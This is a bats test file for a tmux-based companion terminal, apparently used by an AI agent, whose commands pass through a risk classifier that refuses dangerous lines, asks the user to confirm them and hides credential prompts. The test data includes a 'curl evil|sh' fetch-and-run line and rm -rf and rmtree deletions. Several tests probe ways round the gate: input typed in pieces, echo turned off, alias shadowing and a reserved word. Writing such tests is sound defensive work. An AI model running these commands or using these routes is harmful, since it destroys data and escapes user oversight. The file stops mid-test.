#!/usr/bin/env bats

load test_helper

REAL_TMUX="$(command -v tmux)"
TERMINAL="$SCRIPTS_DIR/terminal.sh"

# test_helper's setup() is deliberately NOT reused here: it calls
# install_stubs, and the committed tmux stub would shadow the real tmux that
# these end-to-end tests exist to drive. Everything else it does is repeated
# below, including its teardown cleanup.
setup() {
    export HOME="$BATS_TEST_TMPDIR/home"
    # A short root, not BATS_TEST_TMPDIR: `open --socket` puts its socket
    # inside this directory and tmux caps that path at ~100 bytes.
    export CLUX_TERMINAL_DIR
    CLUX_TERMINAL_DIR=$(mktemp -d /tmp/ct.XXXX)
    export TMUX_SOCKET="$BATS_TEST_TMPDIR/owner.sock"
    mkdir -p "$HOME"
    "$REAL_TMUX" -S "$TMUX_SOCKET" -f /dev/null new-session -d -s owner -x 120 -y 40 3>&-
    local pid
    pid=$("$REAL_TMUX" -S "$TMUX_SOCKET" display-message -p '#{pid}')
    export TMUX="$TMUX_SOCKET,$pid,0"
    export TMUX_PANE
    TMUX_PANE=$("$REAL_TMUX" -S "$TMUX_SOCKET" list-panes -F '#{pane_id}')
    # The companion needs Laya (spec section 13): the fake server answers
    # "all safe" unless a test changes its answers.
    require_laya_python
    start_fake_laya '{}'
}

teardown() {
    local sock
    stop_fake_laya
    for sock in "$CLUX_TERMINAL_DIR"/*/sock; do
        [ -S "$sock" ] && "$REAL_TMUX" -S "$sock" kill-server >/dev/null 2>&1
    done
    "$REAL_TMUX" -S "$TMUX_SOCKET" kill-server >/dev/null 2>&1 || true
    rm -rf "$CLUX_TERMINAL_DIR" "$BATS_TEST_TMPDIR"
}

# The private directory of this owner. One owner per test, so one match.
companion_dir() {
    local dir
    for dir in "$CLUX_TERMINAL_DIR"/*-"${TMUX_PANE#%}"; do
        printf '%s' "$dir"
    done
}

companion_pane() {
    sed -n 's/^pane=//p' "$(companion_dir)/state"
}

file_mode() {
    stat -f %Lp "$1" 2>/dev/null || stat -c %a "$1"
}

# pane_shows TEXT — wait at most 5 s until the companion pane shows TEXT.
pane_shows() {
    local i=0
    while [ "$i" -lt 50 ]; do
        "$REAL_TMUX" -S "$TMUX_SOCKET" capture-pane -p -t "$(companion_pane)" | grep -qF -- "$1" && return 0
        sleep .1
        i=$((i + 1))
    done
    return 1
}

# 1
@test "open makes a split pane and a second open re-uses it" {
    run "$TERMINAL" open
    [ "$status" -eq 0 ]
    [[ "$output" == *'mode=split'* ]] || false
    local first="$output"
    run "$TERMINAL" open
    [ "$status" -eq 0 ]
    [ "$output" = "$first" ]
}

# 2
@test "run returns the output and the exit code, also after a large output" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run -- 'echo hi'
    [ "$status" -eq 0 ]
    [[ "$output" == *$'hi\nexit=0' ]] || false
    run "$TERMINAL" run -- false
    [ "$status" -eq 0 ]
    [[ "$output" == *'exit=1' ]] || false
    run "$TERMINAL" run -- 'seq 1 30000'
    [ "$status" -eq 0 ]
    [[ "$output" == *'30000'* ]] || false
    [[ "$output" == *'output cut'* ]] || false
    [ "$(printf '%s\n' "$output" | grep -c '^[0-9]*$')" -le 200 ]
    run "$TERMINAL" run -- 'echo hi'
    [ "$status" -eq 0 ] || { echo "after large output: $status $output"; false; }
}

# 2b
@test "run --max-lines cuts the output" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run --max-lines 3 -- 'seq 1 10'
    [ "$status" -eq 0 ]
    [[ "$output" == *$'8\n9\n10\nexit=0' ]] || false
    [[ "$output" != *$'\n7\n'* ]] || false
}

# 3
@test "the working directory stays from one run to the next" {
    "$TERMINAL" open >/dev/null
    "$TERMINAL" run -- 'cd /tmp' >/dev/null
    run "$TERMINAL" run -- 'pwd'
    [[ "$output" == *$'/tmp\nexit=0' ]] || false
}

# 4
@test "an exported variable stays from one run to the next" {
    "$TERMINAL" open >/dev/null
    "$TERMINAL" run -- 'export X=1' >/dev/null
    run "$TERMINAL" run -- 'echo $X'
    [[ "$output" == *$'1\nexit=0' ]] || false
}

# 5
@test "the output file is deleted and the private files are private" {
    "$TERMINAL" open >/dev/null
    local d
    d=$(companion_dir)
    "$TERMINAL" run -- "touch '$BATS_TEST_TMPDIR/made'" >/dev/null
    [ "$(file_mode "$d")" = 700 ]
    [ "$(file_mode "$d/state")" = 600 ]
    [ "$(file_mode "$d/1.rc")" = 600 ]
    [ ! -e "$d/1.out" ]
    [ "$(file_mode "$BATS_TEST_TMPDIR/made")" != 600 ]
}

# 6
@test "run stops at its time limit and wait --run gets the result" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run --timeout 1 -- 'echo early; sleep 3; echo late'
    [ "$status" -eq 1 ]
    [[ "$output" == 'run=1'* ]] || false
    [ "$(file_mode "$(companion_dir)/1.out")" = 600 ]
    run "$TERMINAL" wait --timeout 10 --max-lines 1 --run 1
    [ "$status" -eq 0 ]
    [[ "$output" == $'output cut: the last 1 of 2 lines\nlate\nexit=0' ]] || false
    [ ! -d "$(companion_dir)/busy" ]
}

# 7
@test "a second run while the first is not complete exits 5" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run --timeout 1 -- 'sleep 3'
    [ "$status" -eq 1 ]
    run "$TERMINAL" run -- 'echo no'
    [ "$status" -eq 5 ]
}

# 7b
@test "a lock left by a completed run does not block the next run" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run --timeout 1 -- 'sleep 2'
    [ "$status" -eq 1 ]
    sleep 3
    run "$TERMINAL" run -- 'echo next'
    [ "$status" -eq 0 ]
    [[ "$output" == *$'next\nexit=0' ]] || false
}

# 8
@test "a credential prompt stops run, read and wait until the user answers" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run -- 'read -s -p "Password: " p; echo "got:$p"'
    [ "$status" -eq 3 ]
    [[ "$output" != *'Password'* ]] || false
    run "$TERMINAL" read
    [ "$status" -eq 3 ]
    [[ "$output" != *'Password'* ]] || false
    local start=$SECONDS
    run "$TERMINAL" wait --timeout 3 --run 1
    [ "$status" -eq 1 ]
    [ $((SECONDS - start)) -ge 2 ]
    "$REAL_TMUX" -S "$TMUX_SOCKET" send-keys -t "$(companion_pane)" 'hunter2' Enter
    run "$TERMINAL" wait --timeout 10 --run 1
    [ "$status" -eq 0 ]
    [ "$output" = 'exit=0' ]
}

# 9
@test "run --secret returns only the exit code and blocks wait --pattern" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run --secret -- 'echo token'
    [ "$status" -eq 0 ]
    [ "$output" = $'run=1\nexit=0' ]
    run "$TERMINAL" wait --timeout 2 --pattern token
    [ "$status" -eq 3 ]
    run "$TERMINAL" read
    [ "$status" -eq 3 ]
}

# 10
@test "send, wait and read control interactive work" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" send --enter -- 'read -p "Name? " name; echo "hello:$name"'
    [ "$status" -eq 0 ]
    run "$TERMINAL" wait --timeout 5 --pattern 'Name\?'
    [ "$status" -eq 0 ]
    "$TERMINAL" send --enter -- Ada
    run "$TERMINAL" wait --timeout 5 --idle
    [ "$status" -eq 0 ]
    run "$TERMINAL" read --lines 20
    [[ "$output" == *'hello:Ada'* ]] || false
}

# wait --idle must actually wait. A `wait` that returns 0 immediately also
# passes the case above, so this case pins the busy answer.
@test "wait --idle reports busy while a command runs, idle once it ends" {
    "$TERMINAL" open >/dev/null
    "$TERMINAL" send --enter -- 'sleep 4' >/dev/null
    run "$TERMINAL" wait --timeout 1 --idle
    [ "$status" -eq 1 ] || { echo "expected busy (1), got $status"; false; }
    run "$TERMINAL" wait --timeout 10 --idle
    [ "$status" -eq 0 ] || { echo "expected idle (0), got $status"; false; }
}

# 11
@test "close removes the pane and the directory, close --hook is silent" {
    "$TERMINAL" open >/dev/null
    local pane
    pane=$(companion_pane)
    run "$TERMINAL" close
    [ "$status" -eq 0 ]
    [ -z "$(find "$CLUX_TERMINAL_DIR" -mindepth 1 -maxdepth 1 -print -quit)" ]
    ! "$REAL_TMUX" -S "$TMUX_SOCKET" list-panes -t "$pane" >/dev/null 2>&1 || false
    run bash -c "printf x | '$TERMINAL' close --hook"
    [ "$status" -eq 0 ]
    [ -z "$output" ]
}

# 11b
@test "close --owner closes the companion of another owner pane" {
    "$TERMINAL" open >/dev/null
    local owner="$TMUX_PANE"
    run env TMUX_PANE=%999 "$TERMINAL" close --owner "$owner"
    [ "$status" -eq 0 ]
    [ -z "$(find "$CLUX_TERMINAL_DIR" -mindepth 1 -maxdepth 1 -print -quit)" ]
}

# 12
@test "the reaper removes a gone owner and keeps a live foreign server" {
    local key
    key=$("$REAL_TMUX" -S "$TMUX_SOCKET" display-message -p '#{pid}-#{start_time}')
    mkdir -p "$CLUX_TERMINAL_DIR/$key-999" "$CLUX_TERMINAL_DIR/$$-1-3"
    "$TERMINAL" open >/dev/null
    [ ! -e "$CLUX_TERMINAL_DIR/$key-999" ]
    [ -d "$CLUX_TERMINAL_DIR/$$-1-3" ]
}

# 14
@test "a completed run keeps output that looks like a credential line" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run -- 'echo token: abc'
    [ "$status" -eq 0 ]
    [[ "$output" == *$'token: abc\nexit=0' ]] || false
}

# 15
@test "a background process that holds the output gives a note and no lock" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run -- 'sleep 4 & echo started'
    [ "$status" -eq 0 ]
    [[ "$output" == *'started'* ]] || false
    [[ "$output" == *'output may be incomplete'* ]] || false
    [[ "$output" == *'exit=0' ]] || false
    [ ! -d "$(companion_dir)/busy" ]
}

# 16
@test "open makes a new companion after the pane is killed" {
    "$TERMINAL" open >/dev/null
    "$REAL_TMUX" -S "$TMUX_SOCKET" kill-pane -t "$(companion_pane)"
    run "$TERMINAL" open
    [ "$status" -eq 0 ]
    run "$TERMINAL" run -- 'echo hi'
    [ "$status" -eq 0 ]
    [[ "$output" == *$'hi\nexit=0' ]] || false
}

# 17
@test "exit cannot close the pane shell" {
    "$TERMINAL" open >/dev/null
    local pane
    pane=$(companion_pane)
    run "$TERMINAL" run -- 'exit'
    [ "$status" -eq 2 ]
    run "$TERMINAL" run -- 'echo a; exit'
    [ "$status" -eq 0 ]
    [[ "$output" == *'a'* ]] || false
    "$REAL_TMUX" -S "$TMUX_SOCKET" list-panes -t "$pane" >/dev/null
    run "$TERMINAL" run -- 'echo alive'
    [[ "$output" == *$'alive\nexit=0' ]] || false
}

# 18
@test "output with no final newline keeps exit on its own line" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run -- 'printf hi'
    [ "$status" -eq 0 ]
    [[ "$output" == *$'\nhi\nexit=0' ]] || false
    run "$TERMINAL" run -- 'echo after'
    [ "$status" -eq 0 ]
}

# 19
@test "the next plain run clears a secret from the screen and the history" {
    "$TERMINAL" open >/dev/null
    "$TERMINAL" run --secret -- 'echo token' >/dev/null
    run "$TERMINAL" run -- true
    [ "$status" -eq 0 ]
    run "$TERMINAL" read
    [ "$status" -eq 0 ]
    [[ "$output" != *'token'* ]] || false
    run "$REAL_TMUX" -S "$TMUX_SOCKET" capture-pane -p -t "$(companion_pane)" -S -50
    [[ "$output" != *'token'* ]] || false
}

# 20
@test "a command cannot change the wrapper variables or leave the wrapper" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run -- 'for n in 7 8; do echo $n; done'
    [[ "$output" == *$'7\n8\nexit=0' ]] || false
    run "$TERMINAL" run -- 'echo hi'
    [ "$status" -eq 0 ]
    run "$TERMINAL" run -- 'D=oops; echo hi'
    [[ "$output" == *$'hi\nexit=0' ]] || false
    run "$TERMINAL" run -- 'return'
    [ "$status" -eq 2 ]
}

# 21
@test "wait --idle stops on a credential prompt" {
    "$TERMINAL" open >/dev/null
    "$TERMINAL" send --enter -- 'read -s -p "Password: " p' >/dev/null
    run "$TERMINAL" wait --timeout 5 --idle
    [ "$status" -eq 3 ]
}

@test "socket mode opens a private server and close stops it" {
    run "$TERMINAL" open --socket
    [ "$status" -eq 0 ]
    [[ "$output" == *'mode=socket'* ]] || false
    [[ "$output" == *'attach=tmux -S '* ]] || false
    local sock
    sock="$(companion_dir)/sock"
    run "$TERMINAL" open --socket
    [[ "$output" == *'attach=tmux -S '* ]] || false
    run "$TERMINAL" run -- 'echo private'
    [[ "$output" == *$'private\nexit=0' ]] || false
    "$TERMINAL" close
    ! "$REAL_TMUX" -S "$sock" list-sessions >/dev/null 2>&1 || false
}

# Laya 6
@test "close stops the laya server that open started and deletes laya.log" {
    local data="$BATS_TEST_TMPDIR/data" d pid
    make_fake_venv "$data/clux/laya"
    make_fake_checkpoint "$BATS_TEST_TMPDIR/hf"
    run env CLUX_LAYA_URL= CLUX_LAYA_KEY= XDG_DATA_HOME="$data" HF_HUB_CACHE="$BATS_TEST_TMPDIR/hf" \
        "$TERMINAL" open
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    d=$(companion_dir)
    pid=$(sed -n 's/^laya_pid=//p' "$d/state")
    [ -n "$pid" ]
    ps -o command= -p "$pid" | grep -q laya-serve
    [ "$(file_mode "$d/laya.log")" = 600 ]
    grep -q '^laya_url=http://127.0.0.1:[0-9][0-9]*$' "$d/state"
    grep -Eq '^laya_key=[0-9a-f]{64}$' "$d/state"
    run "$TERMINAL" close
    [ "$status" -eq 0 ]
    ! kill -0 "$pid" 2>/dev/null || false
    [ ! -e "$d" ]
}

@test "close --hook removes the pane and the directory first and does not wait for the server" {
    local data="$BATS_TEST_TMPDIR/data" d pid pane start
    make_fake_venv "$data/clux/laya"
    make_fake_checkpoint "$BATS_TEST_TMPDIR/hf"
    CLUX_FAKE_LAYA_IGNORE_TERM=1 CLUX_LAYA_URL= CLUX_LAYA_KEY= XDG_DATA_HOME="$data" \
        HF_HUB_CACHE="$BATS_TEST_TMPDIR/hf" "$TERMINAL" open >/dev/null
    d=$(companion_dir)
    pane=$(companion_pane)
    pid=$(sed -n 's/^laya_pid=//p' "$d/state")
    kill -0 "$pid"
    start=$SECONDS
    run "$TERMINAL" close --hook < /dev/null
    local took=$((SECONDS - start)) alive=0
    ! kill -0 "$pid" 2>/dev/null || alive=1
    # The server ignores TERM, so it holds the bats output until kill -9.
    kill -9 "$pid" 2>/dev/null || true
    [ "$status" -eq 0 ]
    [ "$took" -lt 2 ]
    [ "$alive" -eq 1 ]
    [ ! -e "$d" ]
    ! "$REAL_TMUX" -S "$TMUX_SOCKET" list-panes -t "$pane" >/dev/null 2>&1 || false
}

@test "close --hook still stops a server that ignores TERM, after the hook ends" {
    local data="$BATS_TEST_TMPDIR/data" d pid i=0
    make_fake_venv "$data/clux/laya"
    make_fake_checkpoint "$BATS_TEST_TMPDIR/hf"
    CLUX_FAKE_LAYA_IGNORE_TERM=1 CLUX_LAYA_URL= CLUX_LAYA_KEY= XDG_DATA_HOME="$data" \
        HF_HUB_CACHE="$BATS_TEST_TMPDIR/hf" "$TERMINAL" open >/dev/null
    d=$(companion_dir)
    pid=$(sed -n 's/^laya_pid=//p' "$d/state")
    "$TERMINAL" close --hook < /dev/null
    while kill -0 "$pid" 2>/dev/null && [ "$i" -lt 30 ]; do sleep .2; i=$((i + 1)); done
    local alive=0
    ! kill -0 "$pid" 2>/dev/null || alive=1
    kill -9 "$pid" 2>/dev/null || true
    [ "$alive" -eq 0 ]
}

@test "the reaper stops the laya server of an owner pane that is gone" {
    local data="$BATS_TEST_TMPDIR/data" other pid
    make_fake_venv "$data/clux/laya"
    make_fake_checkpoint "$BATS_TEST_TMPDIR/hf"
    other=$("$REAL_TMUX" -S "$TMUX_SOCKET" split-window -d -P -F '#{pane_id}' -t "$TMUX_PANE" 3>&-)
    TMUX_PANE="$other" CLUX_LAYA_URL= CLUX_LAYA_KEY= XDG_DATA_HOME="$data" \
        HF_HUB_CACHE="$BATS_TEST_TMPDIR/hf" "$TERMINAL" open >/dev/null
    pid=$(sed -n 's/^laya_pid=//p' "$CLUX_TERMINAL_DIR"/*-"${other#%}"/state)
    [ -n "$pid" ]
    kill -0 "$pid"
    "$REAL_TMUX" -S "$TMUX_SOCKET" kill-pane -t "$other"
    "$TERMINAL" open >/dev/null
    ! kill -0 "$pid" 2>/dev/null || false
}

@test "wait --idle prints the pane state at its time limit" {
    set_fake_laya '{"answers": {"state": "pager"}}'
    "$TERMINAL" open >/dev/null
    "$TERMINAL" send --enter -- 'sleep 3' >/dev/null
    run "$TERMINAL" wait --timeout 1 --idle
    [ "$status" -eq 1 ]
    [ "$output" = 'pane=pager' ]
}

@test "wait --idle exits 6 after three failed pane probes in a row, not after one" {
    "$TERMINAL" open >/dev/null
    "$TERMINAL" send --enter -- 'sleep 15' >/dev/null
    stop_fake_laya
    run "$TERMINAL" wait --timeout 2 --idle
    [ "$status" -eq 1 ]
    run "$TERMINAL" wait --timeout 10 --idle
    [ "$status" -eq 6 ]
    [[ "$output" == *'laya not available: close and open the companion'* ]] || false
}

@test "wait --pattern goes on after one failed pane probe" {
    "$TERMINAL" open >/dev/null
    "$TERMINAL" send --enter -- 'sleep 15' >/dev/null
    # Only the pane question fails: the guard of the screen still works.
    set_fake_laya '{"rules": [{"asks": "state", "fail": 500}]}'
    # Two probes in 1 s: fewer than the three failures in a row that stop it.
    run "$TERMINAL" wait --timeout 1 --pattern 'clux-no-match'
    [ "$status" -eq 1 ] || { echo "$output"; false; }
}

@test "wait --run 6 says that the command continues" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run --timeout 1 -- 'sleep 15'
    [ "$status" -eq 1 ]
    stop_fake_laya
    run "$TERMINAL" wait --timeout 10 --run 1
    [ "$status" -eq 6 ]
    [ "$output" = 'laya not available: run 1 continues in the pane; use wait --run 1 again' ]
}

@test "a wait sends no pane request while the screen does not change" {
    "$TERMINAL" open >/dev/null
    "$TERMINAL" send --enter -- 'sleep 15' >/dev/null
    sleep 1
    : > "$FAKE_LAYA_LOG"
    run "$TERMINAL" wait --timeout 4 --idle
    [ "$status" -eq 1 ]
    [ "$(fake_laya_states state | wc -l | tr -d ' ')" -eq 1 ]
}

@test "a blank cursor line is not the line above it" {
    "$TERMINAL" open >/dev/null
    "$TERMINAL" send --enter -- 'echo abc; read -r x' >/dev/null
    pane_shows abc
    run "$TERMINAL" send --enter -- 'hello'
    [ "$status" -eq 0 ]
    [ "$(fake_laya_states destructive | tail -n 1)" = '"hello"' ]
    # The pane probe gets the blank cursor line as its last line.
    "$TERMINAL" send --enter -- 'read -r y' >/dev/null
    "$TERMINAL" wait --timeout 2 --idle >/dev/null || true
    [[ "$(fake_laya_states state | tail -n 1)" == *'read -r y\n"' ]] || { fake_laya_states state | tail -n 1; false; }
}

@test "a credential answer from Laya stops a run with exit 3" {
    set_fake_laya '{"rules": [{"contains": "Enter value", "answers": {"state": "credential"}}]}'
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run --timeout 5 -- 'read -r -p "Enter value " v; echo "got:$v"'
    [ "$status" -eq 3 ]
    [[ "$output" == *'credential prompt in the companion pane'* ]] || false
}

# Laya 1
@test "a dangerous run asks the user in the pane: y runs it, n declines it" {
    set_fake_laya '{"rules": [{"contains": "clux-danger", "answers": {"risk": "dangerous", "destructive": 0.95}}]}'
    "$TERMINAL" open >/dev/null
    local one="$BATS_TEST_TMPDIR/clux-danger-1" two="$BATS_TEST_TMPDIR/clux-danger-2" d
    mkdir -p "$one" "$two"
    d=$(companion_dir)
    run "$TERMINAL" run --timeout 2 -- "rm -rf '$one'"
    [ "$status" -eq 1 ]
    [[ "$output" == 'run=1'* ]] || false
    pane_shows 'laya: dangerous (destructive 0.95)'
    pane_shows 'run? [y/N]'
    [ -d "$one" ]
    run "$TERMINAL" send -- 'y'
    [ "$status" -eq 3 ]
    [ "$output" = 'laya confirmation in the companion pane: the user must answer it there' ]
    run "$TERMINAL" read
    [ "$status" -eq 3 ]
    run "$TERMINAL" wait --timeout 1 --idle
    [ "$status" -eq 3 ]
    run "$TERMINAL" wait --timeout 1 --pattern 'x'
    [ "$status" -eq 3 ]
    "$REAL_TMUX" -S "$TMUX_SOCKET" send-keys -t "$(companion_pane)" y Enter
    run "$TERMINAL" wait --timeout 5 --run 1
    [ "$status" -eq 0 ]
    [[ "$output" == *'exit=0' ]] || false
    [ ! -e "$one" ]
    [ ! -e "$d/1.confirm" ]
    run "$TERMINAL" run --timeout 2 -- "rm -rf '$two'"
    [ "$status" -eq 1 ]
    pane_shows "$two"
    "$REAL_TMUX" -S "$TMUX_SOCKET" send-keys -t "$(companion_pane)" n Enter
    run "$TERMINAL" wait --timeout 5 --run 2
    [ "$status" -eq 0 ]
    [ "$output" = $'laya: declined by the user\nexit=126' ]
    [ -d "$two" ]
    # send has no safe list, so the screen with clux-danger must go first.
    "$REAL_TMUX" -S "$TMUX_SOCKET" send-keys -t "$(companion_pane)" clear Enter
    sleep .5
    "$REAL_TMUX" -S "$TMUX_SOCKET" clear-history -t "$(companion_pane)"
    run "$TERMINAL" send -- 'echo again'
    [ "$status" -eq 0 ]
    run "$TERMINAL" read
    [ "$status" -eq 0 ]
}

@test "a declined run cannot run again through __clux_run" {
    set_fake_laya '{"rules": [{"contains": "clux-danger", "answers": {"risk": "dangerous", "destructive": 0.95}}]}'
    "$TERMINAL" open >/dev/null
    local one="$BATS_TEST_TMPDIR/clux-danger-1" d
    mkdir -p "$one"
    d=$(companion_dir)
    run "$TERMINAL" run --timeout 2 -- "rm -rf '$one'"
    [ "$status" -eq 1 ]
    pane_shows 'run? [y/N]'
    "$REAL_TMUX" -S "$TMUX_SOCKET" send-keys -t "$(companion_pane)" n Enter
    run "$TERMINAL" wait --timeout 5 --run 1
    [ "$status" -eq 0 ]
    [ "$output" = $'laya: declined by the user\nexit=126' ]
    # The reserved word is refused before Laya, in send and in run.
    run "$TERMINAL" send --enter -- '__clux_run 1'
    [ "$status" -eq 2 ]
    run "$TERMINAL" send -- ' __clux_run 1'
    [ "$status" -eq 2 ]
    run "$TERMINAL" run -- '__clux_run 1'
    [ "$status" -eq 2 ]
    # The pane shell refuses a run that has no .cmd or that has an .rc.
    "$REAL_TMUX" -S "$TMUX_SOCKET" send-keys -t "$(companion_pane)" '__clux_run 1' Enter
    sleep 1
    [ -d "$one" ]
    [ ! -e "$d/1.cmd" ]
    [ "$(cat "$d/1.rc")" = 126 ]
}

# Laya 2
@test "a caution run prints the note before exit, also through wait --run" {
    set_fake_laya '{"rules": [{"contains": "touch", "answers": {"risk": "caution", "destructive": 0.4}}]}'
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run -- "touch '$BATS_TEST_TMPDIR/c'"
    [ "$status" -eq 0 ]
    [[ "$output" == *$'laya: caution (destructive 0.40)\nexit=0' ]] || false
    [ -e "$BATS_TEST_TMPDIR/c" ]
    run "$TERMINAL" run --timeout 1 -- "sleep 2; touch '$BATS_TEST_TMPDIR/d'"
    [ "$status" -eq 1 ]
    run "$TERMINAL" wait --timeout 10 --run 2
    [ "$status" -eq 0 ]
    [[ "$output" == *$'laya: caution (destructive 0.40)\nexit=0' ]] || false
}

# Laya 5
@test "run exits 6 and does not run the command when Laya stops" {
    "$TERMINAL" open >/dev/null
    stop_fake_laya
    run "$TERMINAL" run -- "touch '$BATS_TEST_TMPDIR/never'"
    [ "$status" -eq 6 ]
    [[ "$output" == *'laya not available: close and open the companion'* ]] || false
    [ ! -e "$BATS_TEST_TMPDIR/never" ]
    [ ! -d "$(companion_dir)/busy" ]
}

@test "send --key C-c stops a command when Laya stops" {
    "$TERMINAL" open >/dev/null
    "$TERMINAL" send --enter -- "sleep 2 && touch '$BATS_TEST_TMPDIR/never'" >/dev/null
    stop_fake_laya
    run "$TERMINAL" send --key C-c
    [ "$status" -eq 0 ]
    run "$TERMINAL" send --key Escape
    [ "$status" -eq 0 ]
    # Other keys still need Laya.
    run "$TERMINAL" send --key Up
    [ "$status" -eq 6 ]
    sleep 3
    [ ! -e "$BATS_TEST_TMPDIR/never" ]
}

@test "a safe-list run sends no command request to Laya" {
    "$TERMINAL" open >/dev/null
    : > "$FAKE_LAYA_LOG"
    run "$TERMINAL" run -- 'echo hi'
    [ "$status" -eq 0 ]
    [ -z "$(fake_laya_states destructive)" ]
    run "$TERMINAL" run -- 'true'
    [ "$status" -eq 0 ]
    [ "$(fake_laya_states destructive)" = '"true"' ]
}

@test "run refuses a blank command with exit 2" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run -- '   '
    [ "$status" -eq 2 ]
    [ "$output" = 'run needs a command' ]
    [ ! -d "$(companion_dir)/busy" ]
}

@test "a safe-list run refuses an alias or a function of the same name" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run -- "alias ls='touch $BATS_TEST_TMPDIR/alias'"
    [ "$status" -eq 0 ]
    run "$TERMINAL" run -- 'ls'
    [ "$status" -eq 0 ]
    [ ! -e "$BATS_TEST_TMPDIR/alias" ]
    run "$TERMINAL" run -- "pwd() { touch '$BATS_TEST_TMPDIR/function'; }"
    [ "$status" -eq 0 ]
    run "$TERMINAL" run -- 'pwd'
    [ "$status" -eq 0 ]
    [[ "$output" == *$'refused: the first word is an alias or a function in the companion shell\nexit=126' ]] || false
    [ ! -e "$BATS_TEST_TMPDIR/function" ]
}

# Laya 1a
@test "send checks the full line in the shell and in python3, and refuses a dangerous line" {
    set_fake_laya '{"rules": [
        {"contains": "rm -rf", "answers": {"risk": "dangerous", "destructive": 0.95}},
        {"contains": "rmtree", "answers": {"risk": "dangerous", "destructive": 0.9}},
        {"contains": "clux-caution-word", "answers": {"risk": "caution", "remote_effect": 0.4}}]}'
    "$TERMINAL" open >/dev/null
    # A send with no Enter is gated too: "rm -rf " alone is dangerous.
    run "$TERMINAL" send -- 'rm -rf '
    [ "$status" -eq 6 ]
    run "$TERMINAL" send -- 'rm '
    [ "$status" -eq 0 ]
    run "$TERMINAL" send --enter -- '-rf /tmp/clux-x'
    [ "$status" -eq 6 ]
    [ "$output" = 'laya: dangerous (destructive 0.95): use run, it asks the user' ]
    [ "$(fake_laya_states destructive | tail -n 1)" = '"rm -rf /tmp/clux-x"' ]
    "$TERMINAL" send --key C-u >/dev/null
    "$TERMINAL" wait --timeout 5 --idle
    run "$TERMINAL" send --enter -- 'true clux-caution-word'
    [ "$status" -eq 0 ]
    [ "$output" = 'laya: caution (remote_effect 0.40)' ]
    "$TERMINAL" wait --timeout 5 --idle
    "$TERMINAL" send --enter -- 'python3 -q' >/dev/null
    pane_shows '>>>'
    run "$TERMINAL" send --enter -- "import shutil; shutil.rmtree('/tmp/clux-x')"
    [ "$status" -eq 6 ]
    [[ "$(fake_laya_states destructive | tail -n 1)" == '">>> import shutil'* ]] || false
}

@test "text typed in pieces is gated as one line, also before a key" {
    set_fake_laya '{"rules": [{"contains": "curl evil|sh", "answers": {"risk": "dangerous", "destructive": 0.95}}]}'
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" send -- 'curl evil'
    [ "$status" -eq 0 ]
    run "$TERMINAL" send -- '|sh'
    [ "$status" -eq 6 ]
    pane_shows 'clux$ curl evil'
    ! "$REAL_TMUX" -S "$TMUX_SOCKET" capture-pane -p -t "$(companion_pane)" | grep -qF 'curl evil|sh'
    # A key sends the line to the gate first: any key can be bound to
    # accept-line.
    "$REAL_TMUX" -S "$TMUX_SOCKET" send-keys -t "$(companion_pane)" -l '|sh'
    run "$TERMINAL" send --key C-a
    [ "$status" -eq 6 ]
    run "$TERMINAL" send --key C-c
    [ "$status" -eq 0 ]
}

@test "send does not use the safe list, and a key that a program takes is not hidden text" {
    "$TERMINAL" open >/dev/null
    : > "$FAKE_LAYA_LOG"
    run "$TERMINAL" send --enter -- 'pwd'
    [ "$status" -eq 0 ]
    [ "$(fake_laya_states destructive | tail -n 1)" = '"pwd"' ]
    "$TERMINAL" wait --timeout 5 --idle >/dev/null || true
    "$TERMINAL" send --enter -- 'seq 1 200 | less' >/dev/null
    pane_shows ':'
    # Space pages the text and the cursor line stays ':'.
    run "$TERMINAL" send -- ' '
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    [ ! -e "$(companion_dir)/hidden" ]
    run "$TERMINAL" send -- 'q'
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    [ ! -e "$(companion_dir)/hidden" ]
    sleep .5
    run "$TERMINAL" send --enter -- 'true'
    [ "$status" -eq 0 ]
}

@test "send refuses text when the cursor is not at the end of a shell line" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" send -- 'echo abc'
    [ "$status" -eq 0 ]
    run "$TERMINAL" send --key C-a
    [ "$status" -eq 0 ]
    run "$TERMINAL" send -- 'rm -rf x; '
    [ "$status" -eq 2 ]
    [ "$output" = 'the cursor is not at the end of the line: send --key End or --key C-c first' ]
    run "$TERMINAL" send --key C-e
    [ "$status" -eq 0 ]
    run "$TERMINAL" send -- ' def'
    [ "$status" -eq 0 ]
}

@test "send --key refuses text that is not a key name, also after stty -echo" {
    "$TERMINAL" open >/dev/null
    "$TERMINAL" send --enter -- 'stty -echo' >/dev/null
    "$TERMINAL" wait --timeout 5 --idle
    run "$TERMINAL" send --key "touch $BATS_TEST_TMPDIR/keytext"
    [ "$status" -eq 2 ]
    [ "$output" = "not a key name: touch $BATS_TEST_TMPDIR/keytext: send text with send -- TEXT" ]
    run "$TERMINAL" send --key a
    [ "$status" -eq 2 ]
    run "$TERMINAL" send --key Enter
    [ "$status" -eq 0 ]
    sleep 1
    [ ! -e "$BATS_TEST_TMPDIR/keytext" ]
}

@test "text that the pane does not show stops send and run until C-c" {
    "$TERMINAL" open >/dev/null
    "$TERMINAL" send --enter -- 'stty -echo' >/dev/null
    "$TERMINAL" wait --timeout 5 --idle
    run "$TERMINAL" send -- "touch '$BATS_TEST_TMPDIR/hidden'"
    [ "$status" -eq 3 ]
    [ "$output" = 'text that the pane does not show is on the line: send --key C-c first' ]
    run "$TERMINAL" send --key Enter
    [ "$status" -eq 3 ]
